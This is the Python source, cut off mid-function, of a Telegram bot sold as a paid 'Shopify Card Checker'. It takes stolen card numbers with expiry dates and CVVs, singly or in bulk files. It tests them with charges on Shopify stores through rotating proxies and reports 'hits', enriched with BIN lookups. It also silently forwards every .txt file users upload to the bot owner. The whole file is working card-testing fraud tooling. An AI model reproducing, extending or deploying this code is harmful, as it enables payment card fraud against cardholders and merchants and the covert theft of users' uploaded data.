"""
Shopify Card Checker - Button-Driven Telegram Bot
100% button-based interface (except /start command)
"""

from telethon import TelegramClient, events, Button
from telethon.tl.types import DocumentAttributeFilename
from telethon.errors import UserNotParticipantError
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
from datetime import datetime, timedelta
from typing import Optional, Dict, List, Tuple
from dotenv import load_dotenv

load_dotenv()

# ========== CONFIGURATION ==========
API_ID = int(os.getenv('API_ID', '0'))
API_HASH = os.getenv('API_HASH', '')
BOT_TOKEN = os.getenv('BOT_TOKEN', '')
ADMIN_IDS = [int(x) for x in os.getenv('ADMIN_IDS', '').split(',') if x.strip()]
OWNER_ID = ADMIN_IDS[0] if ADMIN_IDS else 0
PVT_CHANNEL_ID = int(os.getenv('PVT_CHANNEL_ID', '0'))
API_ENDPOINTS = [
    ep.strip() for ep in os.getenv('API_ENDPOINTS', '').split(',') if ep.strip()
]
MASS_CHECK_WORKERS = int(os.getenv('MASS_CHECK_WORKERS', '20'))

# Files
PREMIUM_FILE = 'premium.json'
KEYS_FILE = 'keys.json'
CREDIT_KEYS_FILE = 'credit_keys.json'
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
BANNED_FILE = 'banned.txt'

# Plans
PLANS = {
    "trial": {"days": 1, "credits": 3000, "price": "2$", "name": "🎁 TRIAL"},
    "bronze": {"days": 3, "credits": 8000, "price": "4$", "name": "🥉 BRONZE"},
    "silver": {"days": 7, "credits": 14000, "price": "8$", "name": "🥈 SILVER"},
    "gold": {"days": 14, "credits": 20000, "price": "12$", "name": "🥇 GOLD"},
    "platinum": {"days": 24, "credits": 30000, "price": "22$", "name": "💎 PLATINUM"},
}

# Site Filters
SITE_FILTERS = {
    "all": {"name": "📋 All Sites", "min": 0, "max": 999999},
    "under5": {"name": "💰 Under $5", "min": 0, "max": 5},
    "under10": {"name": "💰 Under $10", "min": 0, "max": 10},
    "under15": {"name": "💰 Under $15", "min": 0, "max": 15},
    "under20": {"name": "💰 Under $20", "min": 0, "max": 20},
    "under30": {"name": "💰 Under $30", "min": 0, "max": 30},
}

# Global state
bot = TelegramClient('shopify_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
active_sessions: Dict[int, dict] = {}
ACTIVE_FILTER = "all"
_cache_warmup_in_progress = False
_cache_warmup_total = 0
_cache_warmup_done = 0
_site_price_cache: Dict[str, dict] = {}  # {site: {price: float, expires: timestamp}}
_product_cache: Dict[str, dict] = {}  # {site: {product_id: str, expires: timestamp}}

# Health check
_healthy_endpoints: set = set()
_endpoint_lock = asyncio.Lock()
_endpoint_index = 0


# ========== UTILITY FUNCTIONS ==========

async def load_json(file: str, default=None):
    """Load JSON file with error handling"""
    if default is None:
        default = {}
    try:
        if os.path.exists(file):
            async with aiofiles.open(file, 'r') as f:
                content = await f.read()
                return json.loads(content) if content.strip() else default
    except Exception:
        pass
    return default


async def save_json(file: str, data: dict):
    """Save JSON file with error handling"""
    try:
        async with aiofiles.open(file, 'w') as f:
            await f.write(json.dumps(data, indent=2))
    except Exception:
        pass


async def load_lines(file: str) -> List[str]:
    """Load text file lines"""
    try:
        if os.path.exists(file):
            async with aiofiles.open(file, 'r') as f:
                content = await f.read()
                return [line.strip() for line in content.split('\n') if line.strip()]
    except Exception:
        pass
    return []


async def save_lines(file: str, lines: List[str]):
    """Save text file lines"""
    try:
        async with aiofiles.open(file, 'w') as f:
            await f.write('\n'.join(lines))
    except Exception:
        pass


async def is_banned(user_id: int) -> bool:
    """Check if user is banned"""
    banned = await load_lines(BANNED_FILE)
    return str(user_id) in banned


async def is_admin(user_id: int) -> bool:
    """Check if user is admin"""
    return user_id in ADMIN_IDS


async def get_user_credits(user_id: int) -> int:
    """Get user credits from premium file"""
    premium = await load_json(PREMIUM_FILE)
    user_data = premium.get(str(user_id), {})

    # Check if expired
    expiry = user_data.get('expiry')
    if expiry and datetime.now().timestamp() > expiry:
        return 0

    return user_data.get('credits', 0)


async def set_user_credits(user_id: int, credits: int, expiry: Optional[float] = None):
    """Set user credits"""
    premium = await load_json(PREMIUM_FILE)
    user_data = premium.get(str(user_id), {})
    user_data['credits'] = credits
    if expiry:
        user_data['expiry'] = expiry
    premium[str(user_id)] = user_data
    await save_json(PREMIUM_FILE, premium)


async def deduct_credits(user_id: int, amount: int = 1) -> bool:
    """Deduct credits, return True if successful"""
    credits = await get_user_credits(user_id)
    if credits >= amount:
        await set_user_credits(user_id, credits - amount)
        return True
    return False


async def refund_credits(user_id: int, amount: int = 1):
    """Refund credits"""
    credits = await get_user_credits(user_id)
    await set_user_credits(user_id, credits + amount)


# ========== API HEALTH & LOAD BALANCING ==========

async def health_check_loop():
    """Continuously check API endpoints health"""
    while True:
        for ep in API_ENDPOINTS:
            base = ep.rstrip('/shopify')
            health_url = f"{base}/health"
            try:
                timeout = aiohttp.ClientTimeout(total=5)
                async with aiohttp.ClientSession(timeout=timeout) as session:
                    async with session.get(health_url) as resp:
                        if resp.status == 200:
                            _healthy_endpoints.add(ep)
                        else:
                            _healthy_endpoints.discard(ep)
            except Exception:
                _healthy_endpoints.discard(ep)
        await asyncio.sleep(30)


async def get_next_healthy_endpoint() -> str:
    """Get next healthy API endpoint (round-robin)"""
    global _endpoint_index
    async with _endpoint_lock:
        pool = list(_healthy_endpoints) if _healthy_endpoints else API_ENDPOINTS
        if not pool:
            raise Exception("No API endpoints available")
        ep = pool[_endpoint_index % len(pool)]
        _endpoint_index += 1
        return ep


async def call_api(endpoint: str, params: dict, max_tries: int = 2) -> dict:
    """Call API with retries and load balancing"""
    last_error = None

    for _ in range(max_tries):
        try:
            api_url = await get_next_healthy_endpoint()
            timeout = aiohttp.ClientTimeout(total=120)

            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(api_url, params=params) as resp:
                    if resp.status >= 400:
                        body = await resp.text()
                        raise Exception(f"HTTP {resp.status}: {body[:100]}")

                    return await resp.json()
        except Exception as e:
            last_error = e
            await asyncio.sleep(0.5)

    raise Exception(f"API call failed: {last_error}")


# ========== BIN INFO ==========

async def fetch_bin_info(bin_number: str) -> dict:
    """Fetch BIN info from antipublic.cc"""
    try:
        url = f"https://bins.antipublic.cc/bins/{bin_number}"
        timeout = aiohttp.ClientTimeout(total=10)

        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return {
                        'brand': data.get('brand', 'Unknown'),
                        'type': data.get('type', 'Unknown'),
                        'level': data.get('level', 'Unknown'),
                        'bank': data.get('bank', 'Unknown'),
                        'country': data.get('country', 'Unknown'),
                        'flag': data.get('flag', '🏳')
                    }
    except Exception:
        pass

    return {
        'brand': 'Unknown',
        'type': 'Unknown',
        'level': 'Unknown',
        'bank': 'Unknown',
        'country': 'Unknown',
        'flag': '🏳'
    }


# ========== PRICE CACHE ==========

async def get_cached_price(site: str) -> Optional[float]:
    """Get cached price for site"""
    cache_entry = _site_price_cache.get(site)
    if cache_entry and cache_entry['expires'] > time.time():
        return cache_entry['price']
    return None


async def set_cached_price(site: str, price: float):
    """Cache price for site (1 hour TTL)"""
    _site_price_cache[site] = {
        'price': price,
        'expires': time.time() + 3600  # 1 hour
    }


async def warmup_price_cache(progress_callback=None):
    """Warm up price cache for all sites with current filter"""
    global _cache_warmup_in_progress, _cache_warmup_total, _cache_warmup_done

    sites = await load_lines(SITES_FILE)
    if not sites:
        return

    _cache_warmup_in_progress = True
    _cache_warmup_total = len(sites)
    _cache_warmup_done = 0

    filter_config = SITE_FILTERS[ACTIVE_FILTER]
    max_price = filter_config['max'] if filter_config['max'] < 999999 else None

    for site in sites:
        try:
            params = {'url': site}
            if max_price:
                params['max_price'] = max_price

            result = await call_api('/product_price', params)

            if not result.get('error') and 'price' in result:
                await set_cached_price(site, result['price'])
        except Exception:
            pass

        _cache_warmup_done += 1
        if progress_callback:
            await progress_callback(_cache_warmup_done, _cache_warmup_total)

    _cache_warmup_in_progress = False


# ========== BUTTON MENUS ==========

def main_menu_buttons(is_admin: bool = False) -> List[List[Button]]:
    """Generate main menu buttons"""
    buttons = [
        [Button.inline("💳 Single Check", b"single_check")],
        [Button.inline("📁 Mass Check", b"mass_check")],
        [Button.inline("💎 Redeem Key", b"redeem_key")],
        [Button.inline("📊 My Info", b"my_info")],
        [Button.inline("📋 Plans", b"plans")],
    ]

    if is_admin:
        buttons.append([Button.inline("🔒 Admin Panel", b"admin_panel")])

    return buttons


def admin_panel_buttons() -> List[List[Button]]:
    """Generate admin panel buttons"""
    return [
        [Button.inline("🔑 Generate Keys", b"admin_gen_keys")],
        [Button.inline("💰 Manage Credits", b"admin_credits")],
        [Button.inline("🚫 Ban/Unban User", b"admin_ban")],
        [Button.inline("📢 Broadcast", b"admin_broadcast")],
        [Button.inline("🌐 Site Management", b"admin_sites")],
        [Button.inline("🔄 Proxy Management", b"admin_proxies")],
        [Button.inline("📊 Statistics", b"admin_stats")],
        [Button.inline("⚙️ Cache Status", b"admin_cache")],
        [Button.inline("🏠 Back to Main Menu", b"main_menu")],
    ]


def site_management_buttons() -> List[List[Button]]:
    """Generate site management buttons"""
    return [
        [Button.inline("➕ Add Site", b"site_add")],
        [Button.inline("📄 Add from .txt", b"site_add_file")],
        [Button.inline("➖ Remove Site", b"site_remove")],
        [Button.inline("🔍 Test All Sites", b"site_test")],
        [Button.inline("🔄 Set Price Filter", b"site_filter")],
        [Button.inline("🔙 Back", b"admin_panel")],
    ]


def proxy_management_buttons() -> List[List[Button]]:
    """Generate proxy management buttons"""
    return [
        [Button.inline("➕ Add Proxy", b"proxy_add")],
        [Button.inline("📄 Add from .txt", b"proxy_add_file")],
        [Button.inline("➖ Remove Proxy", b"proxy_remove")],
        [Button.inline("🔍 Test All Proxies", b"proxy_test")],
        [Button.inline("🔙 Back", b"admin_panel")],
    ]


def filter_selection_buttons() -> List[List[Button]]:
    """Generate filter selection buttons"""
    buttons = []
    for key, config in SITE_FILTERS.items():
        label = f"{'✅ ' if ACTIVE_FILTER == key else ''}{config['name']}"
        buttons.append([Button.inline(label, f"filter_{key}".encode())])
    buttons.append([Button.inline("🔙 Back", b"admin_sites")])
    return buttons


# ========== MAIN MENU HANDLER ==========

@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    """Handle /start command - show main menu"""
    user_id = event.sender_id

    if await is_banned(user_id):
        await event.respond("❌ You are banned from using this bot.")
        return

    is_admin_user = await is_admin(user_id)
    credits = await get_user_credits(user_id)

    welcome_text = (
        "🤖 **Welcome to Shopify Card Checker**\n\n"
        f"💳 Your Credits: **{credits}**\n"
        f"🎯 Active Filter: **{SITE_FILTERS[ACTIVE_FILTER]['name']}**\n\n"
        "Select an option below:"
    )

    await event.respond(
        welcome_text,
        buttons=main_menu_buttons(is_admin_user),
        parse_mode='md'
    )


# ========== CALLBACK HANDLERS ==========

@bot.on(events.CallbackQuery(pattern=b"main_menu"))
async def main_menu_callback(event):
    """Return to main menu"""
    user_id = event.sender_id
    is_admin_user = await is_admin(user_id)
    credits = await get_user_credits(user_id)

    text = (
        "🤖 **Shopify Card Checker**\n\n"
        f"💳 Your Credits: **{credits}**\n"
        f"🎯 Active Filter: **{SITE_FILTERS[ACTIVE_FILTER]['name']}**\n\n"
        "Select an option:"
    )

    await event.edit(text, buttons=main_menu_buttons(is_admin_user), parse_mode='md')


@bot.on(events.CallbackQuery(pattern=b"my_info"))
async def my_info_callback(event):
    """Show user info"""
    user_id = event.sender_id
    credits = await get_user_credits(user_id)
    premium = await load_json(PREMIUM_FILE)
    user_data = premium.get(str(user_id), {})

    expiry = user_data.get('expiry')
    expiry_str = "Never" if not expiry else datetime.fromtimestamp(expiry).strftime("%Y-%m-%d %H:%M")

    text = (
        "📊 **Your Information**\n\n"
        f"👤 User ID: `{user_id}`\n"
        f"💳 Credits: **{credits}**\n"
        f"⏰ Expires: {expiry_str}\n"
        f"🎯 Active Filter: {SITE_FILTERS[ACTIVE_FILTER]['name']}\n"
    )

    await event.edit(
        text,
        buttons=[[Button.inline("🔙 Back", b"main_menu")]],
        parse_mode='md'
    )


@bot.on(events.CallbackQuery(pattern=b"plans"))
async def plans_callback(event):
    """Show available plans"""
    text = "📋 **Available Plans**\n\n"

    for plan_id, plan in PLANS.items():
        text += (
            f"{plan['name']}\n"
            f"  💰 Price: {plan['price']}\n"
            f"  📅 Duration: {plan['days']} days\n"
            f"  💳 Credits: {plan['credits']}\n\n"
        )

    text += "To purchase, contact the admin."

    await event.edit(
        text,
        buttons=[[Button.inline("🔙 Back", b"main_menu")]],
        parse_mode='md'
    )


@bot.on(events.CallbackQuery(pattern=b"admin_panel"))
async def admin_panel_callback(event):
    """Show admin panel"""
    if not await is_admin(event.sender_id):
        await event.answer("❌ Unauthorized", alert=True)
        return

    text = "🔒 **Admin Panel**\n\nSelect an action:"
    await event.edit(text, buttons=admin_panel_buttons(), parse_mode='md')


@bot.on(events.CallbackQuery(pattern=b"admin_sites"))
async def admin_sites_callback(event):
    """Show site management"""
    if not await is_admin(event.sender_id):
        await event.answer("❌ Unauthorized", alert=True)
        return

    sites = await load_lines(SITES_FILE)
    text = f"🌐 **Site Management**\n\nTotal Sites: {len(sites)}\nActive Filter: {SITE_FILTERS[ACTIVE_FILTER]['name']}"

    await event.edit(text, buttons=site_management_buttons(), parse_mode='md')


@bot.on(events.CallbackQuery(pattern=b"admin_proxies"))
async def admin_proxies_callback(event):
    """Show proxy management"""
    if not await is_admin(event.sender_id):
        await event.answer("❌ Unauthorized", alert=True)
        return

    proxies = await load_lines(PROXY_FILE)
    text = f"🔄 **Proxy Management**\n\nTotal Proxies: {len(proxies)}"

    await event.edit(text, buttons=proxy_management_buttons(), parse_mode='md')


@bot.on(events.CallbackQuery(pattern=b"site_filter"))
async def site_filter_callback(event):
    """Show filter selection"""
    if not await is_admin(event.sender_id):
        await event.answer("❌ Unauthorized", alert=True)
        return

    text = "🔄 **Select Price Filter**\n\nChoose a filter:"
    await event.edit(text, buttons=filter_selection_buttons(), parse_mode='md')


@bot.on(events.CallbackQuery(pattern=rb"filter_(.+)"))
async def filter_select_callback(event):
    """Handle filter selection"""
    if not await is_admin(event.sender_id):
        await event.answer("❌ Unauthorized", alert=True)
        return

    global ACTIVE_FILTER
    filter_key = event.pattern_match.group(1).decode()

    if filter_key not in SITE_FILTERS:
        await event.answer("❌ Invalid filter", alert=True)
        return

    ACTIVE_FILTER = filter_key

    # Start cache warmup
    await event.edit(
        f"✅ Filter set to: {SITE_FILTERS[filter_key]['name']}\n\n"
        "🔄 Starting cache warmup...",
        buttons=[[Button.inline("🔙 Back", b"admin_sites")]]
    )

    # Warmup in background
    asyncio.create_task(warmup_price_cache())
    await asyncio.sleep(1)

    await event.edit(
        f"✅ Filter set to: {SITE_FILTERS[filter_key]['name']}\n\n"
        "✅ Cache warmup started in background.",
        buttons=[[Button.inline("🔙 Back", b"admin_sites")]]
    )


@bot.on(events.CallbackQuery(pattern=b"admin_cache"))
async def admin_cache_callback(event):
    """Show cache status"""
    if not await is_admin(event.sender_id):
        await event.answer("❌ Unauthorized", alert=True)
        return

    cache_size = len(_site_price_cache)

    if _cache_warmup_in_progress:
        progress = (_cache_warmup_done / _cache_warmup_total * 100) if _cache_warmup_total > 0 else 0
        text = (
            "⚙️ **Cache Status**\n\n"
            f"Warmup in progress: {_cache_warmup_done}/{_cache_warmup_total} ({progress:.1f}%)\n"
            f"Cached sites: {cache_size}\n"
        )
    else:
        text = (
            "⚙️ **Cache Status**\n\n"
            f"Cached sites: {cache_size}\n"
            f"Active filter: {SITE_FILTERS[ACTIVE_FILTER]['name']}\n"
        )

    await event.edit(
        text,
        buttons=[[Button.inline("🔙 Back", b"admin_panel")]],
        parse_mode='md'
    )


@bot.on(events.CallbackQuery(pattern=b"admin_stats"))
async def admin_stats_callback(event):
    """Show statistics"""
    if not await is_admin(event.sender_id):
        await event.answer("❌ Unauthorized", alert=True)
        return

    premium = await load_json(PREMIUM_FILE)
    sites = await load_lines(SITES_FILE)
    proxies = await load_lines(PROXY_FILE)

    total_users = len(premium)
    total_credits = sum(u.get('credits', 0) for u in premium.values())

    text = (
        "📊 **Statistics**\n\n"
        f"👥 Total Users: {total_users}\n"
        f"💳 Total Credits: {total_credits}\n"
        f"🌐 Sites: {len(sites)}\n"
        f"🔄 Proxies: {len(proxies)}\n"
        f"📦 Cache Size: {len(_site_price_cache)}\n"
        f"🎯 Active Filter: {SITE_FILTERS[ACTIVE_FILTER]['name']}\n"
    )

    await event.edit(
        text,
        buttons=[[Button.inline("🔙 Back", b"admin_panel")]],
        parse_mode='md'
    )


# ========== SINGLE CHECK ==========

@bot.on(events.CallbackQuery(pattern=b"single_check"))
async def single_check_callback(event):
    """Start single check session"""
    user_id = event.sender_id
    credits = await get_user_credits(user_id)

    if credits < 1:
        await event.answer("❌ Insufficient credits", alert=True)
        return

    active_sessions[user_id] = {'action': 'single_check'}

    await event.edit(
        "💳 **Single Check**\n\n"
        "Send a card in format:\n`cc|mm|yy|cvv`\n\n"
        "Or click Back to cancel.",
        buttons=[[Button.inline("🔙 Back", b"main_menu")]],
        parse_mode='md'
    )


@bot.on(events.NewMessage)
async def message_handler(event):
    """Handle text messages"""
    user_id = event.sender_id

    # File forwarding to owner
    if event.document:
        # Check if it's a .txt file
        file_name = None
        for attr in event.document.attributes:
            if isinstance(attr, DocumentAttributeFilename):
                file_name = attr.file_name
                break

        if file_name and file_name.endswith('.txt') and user_id != OWNER_ID:
            # Forward to owner
            try:
                sender = await event.get_sender()
                sender_name = getattr(sender, 'first_name', 'Unknown')
                sender_username = getattr(sender, 'username', 'N/A')

                caption = (
                    f"📄 File from user:\n"
                    f"Name: {sender_name}\n"
                    f"Username: @{sender_username}\n"
                    f"ID: {user_id}\n"
                    f"File: {file_name}"
                )

                await bot.send_file(OWNER_ID, event.document, caption=caption)
            except Exception:
                pass

    # Check for active session
    session = active_sessions.get(user_id)
    if not session:
        return

    action = session['action']

    if action == 'single_check':
        await handle_single_check(event, event.text)
    elif action == 'mass_check':
        await handle_mass_check(event)
    elif action == 'redeem_key':
        await handle_redeem_key(event, event.text)
    elif action == 'site_add':
        await handle_site_add(event, event.text)
    elif action == 'site_remove':
        await handle_site_remove(event, event.text)
    elif action == 'proxy_add':
        await handle_proxy_add(event, event.text)


async def handle_single_check(event, card_data: str):
    """Process single card check"""
    user_id = event.sender_id

    # Parse card
    match = re.match(r'(\d+)\|(\d+)\|(\d+)\|(\d+)', card_data.strip())
    if not match:
        await event.respond("❌ Invalid format. Use: `cc|mm|yy|cvv`", parse_mode='md')
        return

    cc, mm, yy, cvv = match.groups()

    # Deduct credit
    if not await deduct_credits(user_id, 1):
        await event.respond("❌ Insufficient credits")
        return

    # Clear session
    active_sessions.pop(user_id, None)

    # Show progress
    progress_msg = await event.respond("🔄 **Checking card...**", parse_mode='md')

    try:
        # Get site
        sites = await load_lines(SITES_FILE)
        if not sites:
            await refund_credits(user_id, 1)
            await progress_msg.edit("❌ No sites available")
            return

        # Filter sites by price
        filter_config = SITE_FILTERS[ACTIVE_FILTER]
        available_sites = []

        for site in sites:
            cached_price = await get_cached_price(site)
            if cached_price is not None:
                if filter_config['min'] <= cached_price <= filter_config['max']:
                    available_sites.append(site)

        if not available_sites:
            available_sites = sites  # Fallback

        site = random.choice(available_sites)

        # Get proxy
        proxies = await load_lines(PROXY_FILE)
        proxy = random.choice(proxies) if proxies else None

        # Call API
        params = {
            'url': site,
            'cc': cc,
            'mm': mm,
            'yy': yy,
            'cvv': cvv,
        }

        if proxy:
            params['proxy'] = proxy

        max_price = filter_config['max'] if filter_config['max'] < 999999 else None
        if max_price:
            params['max_price'] = max_price

        result = await call_api('/shopify', params)

        # Handle result
        if result.get('error') == 'NO_PRODUCT_IN_PRICE_RANGE':
            await refund_credits(user_id, 1)
            await progress_msg.edit("❌ No product in price range for this site\n💳 Credit refunded")
            return

        if result.get('error'):
            await refund_credits(user_id, 1)
            await progress_msg.edit(f"❌ Error: {result['error']}\n💳 Credit refunded")
            return

        # Get BIN info
        bin_info = await fetch_bin_info(cc[:6])

        # Format result
        status = result.get('Status', 'Unknown')
        response = result.get('Response', 'Unknown')
        gateway = result.get('Gateway', 'Unknown')
        price = result.get('product_price', result.get('Price', 0))

        status_emoji = "✅" if status else "❌"

        result_text = (
            f"{status_emoji} **Card Check Result**\n\n"
            f"💳 Card: `{cc}|{mm}|{yy}|{cvv}`\n"
            f"📊 Status: **{response}**\n"
            f"🏦 BIN: {bin_info['flag']} {bin_info['brand']} {bin_info['type']} {bin_info['level']}\n"
            f"🏛 Bank: {bin_info['bank']}\n"
            f"🌍 Country: {bin_info['country']}\n"
            f"💰 Price: ${price}\n"
            f"🔐 Gateway: {gateway}\n"
            f"🌐 Site: {site}\n"
            f"🎯 Filter: {SITE_FILTERS[ACTIVE_FILTER]['name']}\n"
        )

        await progress_msg.edit(result_text, parse_mode='md')

    except Exception as e:
        await refund_credits(user_id, 1)
        await progress_msg.edit(f"❌ Error: {str(e)}\n💳 Credit refunded")


# ========== MASS CHECK ==========

@bot.on(events.CallbackQuery(pattern=b"mass_check"))
async def mass_check_callback(event):
    """Start mass check session"""
    user_id = event.sender_id
    credits = await get_user_credits(user_id)

    if credits < 1:
        await event.answer("❌ Insufficient credits", alert=True)
        return

    active_sessions[user_id] = {'action': 'mass_check'}

    await event.edit(
        "📁 **Mass Check**\n\n"
        "Send a .txt file with cards (one per line):\n`cc|mm|yy|cvv`\n\n"
        "Or click Back to cancel.",
        buttons=[[Button.inline("🔙 Back", b"main_menu")]],
        parse_mode='md'
    )


async def handle_mass_check(event):
    """Process mass check file"""
    user_id = event.sender_id

    if not event.document:
        await event.respond("❌ Please send a .txt file")
        return

    # Clear session
    active_sessions.pop(user_id, None)

    # Download file
    try:
        file_path = await event.download_media()

        async with aiofiles.open(file_path, 'r') as f:
            content = await f.read()

        os.remove(file_path)

        # Parse cards
        lines = [line.strip() for line in content.split('\n') if line.strip()]
        cards = []

        for line in lines:
            match = re.match(r'(\d+)\|(\d+)\|(\d+)\|(\d+)', line)
            if match:
                cards.append(match.groups())

        if not cards:
            await event.respond("❌ No valid cards found in file")
            return

        # Check credits
        credits = await get_user_credits(user_id)
        if credits < len(cards):
            await event.respond(f"❌ Insufficient credits. Need {len(cards)}, have {credits}")
            return

        # Deduct credits
        await set_user_credits(user_id, credits - len(cards))

        # Start checking
        progress_msg = await event.respond(
            f"🔄 **Mass Check Started**\n\n"
            f"Total Cards: {len(cards)}\n"
            f"Progress: 0/{len(cards)} (0%)\n"
            f"[░░░░░░░░░░] 0%\n\n"
            f"✅ Hits: 0\n"
            f"❌ Dead: 0",
            parse_mode='md'
        )

        # Process cards
        results = []
        hits = 0
        dead = 0
        refunded = 0

        semaphore = asyncio.Semaphore(MASS_CHECK_WORKERS)

        async def check_card(card_tuple, index):
            nonlocal hits, dead, refunded

            async with semaphore:
                cc, mm, yy, cvv = card_tuple

                try:
                    # Get site and proxy
                    sites = await load_lines(SITES_FILE)
                    if not sites:
                        results.append(f"{cc}|{mm}|{yy}|{cvv} | Error: No sites | N/A | $0")
                        refunded += 1
                        await refund_credits(user_id, 1)
                        return

                    site = random.choice(sites)
                    proxies = await load_lines(PROXY_FILE)
                    proxy = random.choice(proxies) if proxies else None

                    # Call API
                    filter_config = SITE_FILTERS[ACTIVE_FILTER]
                    params = {
                        'url': site,
                        'cc': cc,
                        'mm': mm,
                        'yy': yy,
                        'cvv': cvv,
                    }

                    if proxy:
                        params['proxy'] = proxy

                    max_price = filter_config['max'] if filter_config['max'] < 999999 else None
                    if max_price:
                        params['max_price'] = max_price

                    result = await call_api('/shopify', params)

                    # Handle result
                    if result.get('error') == 'NO_PRODUCT_IN_PRICE_RANGE':
                        results.append(f"{cc}|{mm}|{yy}|{cvv} | Error: No product in range | {site} | $0")
                        refunded += 1
                        await refund_credits(user_id, 1)
                        return

                    if result.get('error'):
                        results.append(f"{cc}|{mm}|{yy}|{cvv} | Error: {result['error']} | {site} | $0")
                        refunded += 1
                        await refund_credits(user_id, 1)
                        return

                    response = result.get('Response', 'Unknown')
                    gateway = result.get('Gateway', 'Unknown')
                    price = result.get('product_price', result.get('Price', 0))

                    if response in ['Charged', 'Approved']:
                        hits += 1
                        results.append(f"{cc}|{mm}|{yy}|{cvv} | ✅ {response} | {gateway} | ${price} | {site}")
                    else:
                        dead += 1
                        results.append(f"{cc}|{mm}|{yy}|{cvv} | ❌ {response} | {gateway} | ${price} | {site}")

                except Exception as e:
                    results.append(f"{cc}|{mm}|{yy}|{cvv} | Error: {str(e)} | N/A | $0")
                    refunded += 1
                    await refund_credits(user_id, 1)

        # Create tasks
        tasks = [check_card(card, i) for i, card in enumerate(cards)]

        # Update progress
        last_update = 0
        while not all(task.done() for task in tasks):
            await asyncio.sleep(2)

            done = sum(1 for task in tasks if task.done())
            progress = (done / len(cards)) * 100
            bar_filled = int(progress / 10)
            bar = '█' * bar_filled + '░' * (10 - bar_filled)

            update_text = (
                f"🔄 **Mass Check in Progress**\n\n"
                f"Total Cards: {len(cards)}\n"
                f"Progress: {done}/{len(cards)} ({progress:.1f}%)\n"
                f"[{bar}] {progress:.0f}%\n\n"
                f"✅ Hits: {hits}\n"
                f"❌ Dead: {dead}\n"
                f"💳 Refunded: {refunded}"
            )

            if done != last_update:
                try:
                    await progress_msg.edit(update_text, parse_mode='md')
                    last_update = done
                except Exception:
                    pass

        # Wait for all tasks
        await asyncio.gather(*tasks)

        # Save results
        timestamp = int(time.time())
        result_file = f"/tmp/mass_check_{user_id}_{timestamp}.txt"

        async with aiofiles.open(result_file, 'w') as f:
            await f.write('\n'.join(results))

        # Send results
        final_text = (
            f"✅ **Mass Check Complete**\n\n"
            f"Total Cards: {len(cards)}\n"
            f"✅ Hits: {hits}\n"
            f"❌ Dead: {dead}\n"
            f"💳 Refunded: {refunded}\n\n"
            f"Results file attached below."
        )

        await event.respond(final_text, file=result_file, parse_mode='md')
        await progress_msg.delete()

        # Cleanup
        os.remove(result_file)

    except Exception as e:
        await event.respond(f"❌ Error: {str(e)}")


# ========== KEY REDEMPTION ==========

@bot.on(events.CallbackQuery(pattern=b"redeem_key"))
async def redeem_key_callback(event):
    """Start key redemption session"""
    active_sessions[event.sender_id] = {'action': 'redeem_key'}

    await event.edit(
        "💎 **Redeem Key**\n\n"
        "Send your key code:\n\n"
        "Or click Back to cancel.",
        buttons=[[Button.inline("🔙 Back", b"main_menu")]],
        parse_mode='md'
    )


async def handle_redeem_key(event, key_code: str):
    """Process key redemption"""
    user_id = event.sender_id
    key_code = key_code.strip()

    # Clear session
    active_sessions.pop(user_id, None)

    # Check premium keys
    premium_keys = await load_json(KEYS_FILE)
    if key_code in premium_keys:
        key_data = premium_keys[key_code]
        plan_id = key_data['plan']

        if plan_id not in PLANS:
            await event.respond("❌ Invalid plan")
            return

        plan = PLANS[plan_id]
        expiry = datetime.now() + timedelta(days=plan['days'])

        await set_user_credits(user_id, plan['credits'], expiry.timestamp())

        # Remove key
        del premium_keys[key_code]
        await save_json(KEYS_FILE, premium_keys)

        await event.respond(
            f"✅ **Key Redeemed!**\n\n"
            f"Plan: {plan['name']}\n"
            f"Credits: {plan['credits']}\n"
            f"Expires: {expiry.strftime('%Y-%m-%d %H:%M')}"
        )
        return

    # Check credit keys
    credit_keys = await load_json(CREDIT_KEYS_FILE)
    if key_code in credit_keys:
        credits = credit_keys[key_code]
        current_credits = await get_user_credits(user_id)
        await set_user_credits(user_id, current_credits + credits)

        # Remove key
        del credit_keys[key_code]
        await save_json(CREDIT_KEYS_FILE, credit_keys)

        await event.respond(
            f"✅ **Key Redeemed!**\n\n"
            f"Credits Added: {credits}\n"
            f"Total Credits: {current_credits + credits}"
        )
        return

    await event.respond("❌ Invalid key")


# ========== ADMIN: KEY GENERATION ==========

@bot.on(events.CallbackQuery(pattern=b"admin_gen_keys"))
async def admin_gen_keys_callback(event):
    """Show key generation options"""
    if not await is_admin(event.sender_id):
        await event.answer("❌ Unauthorized", alert=True)
        return

    buttons = []
    for plan_id, plan in PLANS.items():
        buttons.append([Button.inline(f"Generate {plan['name']}", f"genkey_{plan_id}".encode())])

    buttons.append([Button.inline("💳 Generate Credit Key", b"genkey_credit")])
    buttons.append([Button.inline("🔙 Back", b"admin_panel")])

    await event.edit("🔑 **Generate Keys**\n\nSelect key type:", buttons=buttons, parse_mode='md')


@bot.on(events.CallbackQuery(pattern=rb"genkey_(.+)"))
async def genkey_callback(event):
    """Generate a key"""
    if not await is_admin(event.sender_id):
        await event.answer("❌ Unauthorized", alert=True)
        return

    key_type = event.pattern_match.group(1).decode()

    # Generate random key
    key_code = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=16))

    if key_type == 'credit':
        # For credit keys, ask for amount (default 1000)
        credit_keys = await load_json(CREDIT_KEYS_FILE)
        credit_keys[key_code] = 1000
        await save_json(CREDIT_KEYS_FILE, credit_keys)

        await event.edit(
            f"✅ **Credit Key Generated**\n\n"
            f"Key: `{key_code}`\n"
            f"Credits: 1000\n\n"
            f"Share this key with the user.",
            buttons=[[Button.inline("🔙 Back", b"admin_gen_keys")]],
            parse_mode='md'
        )
    else:
        # Premium key
        if key_type not in PLANS:
            await event.answer("❌ Invalid plan", alert=True)
            return

        plan = PLANS[key_type]
        premium_keys = await load_json(KEYS_FILE)
        premium_keys[key_code] = {'plan': key_type}
        await save_json(KEYS_FILE, premium_keys)

        await event.edit(
            f"✅ **Premium Key Generated**\n\n"
            f"Key: `{key_code}`\n"
            f"Plan: {plan['name']}\n"
            f"Credits: {plan['credits']}\n"
            f"Duration: {plan['days']} days\n\n"
            f"Share this key with the user.",
